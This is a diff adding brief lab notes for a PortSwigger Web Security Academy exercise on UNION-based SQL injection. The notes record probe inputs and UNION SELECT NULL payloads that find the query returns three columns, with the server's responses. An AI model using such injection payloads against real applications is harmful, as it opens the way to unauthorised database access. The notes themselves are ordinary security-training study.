@@ -1,0 +1,30 @@
+# ===========================================
+# Lab: Determine the Number of Columns Returned by the Query
+# Category: UNION-Based SQL Injection
+# Platform: PortSwigger Web Security Academy
+# ===========================================
+
+# 1. SQL Injection Test
+'
+
+# 2. SQL Comment Test
+'--
+
+# 3. UNION SELECT - 2 Columns
+' UNION SELECT NULL,NULL--
+
+# Result:
+# HTTP 500 Internal Server Error
+
+# 4. UNION SELECT - 3 Columns
+' UNION SELECT NULL,NULL,NULL--
+
+# Result:
+# HTTP 200 OK
+# Original query returns 3 columns.
+
+# ===========================================
+# Successful Payload
+# ===========================================
+
+' UNION SELECT NULL,NULL,NULL--
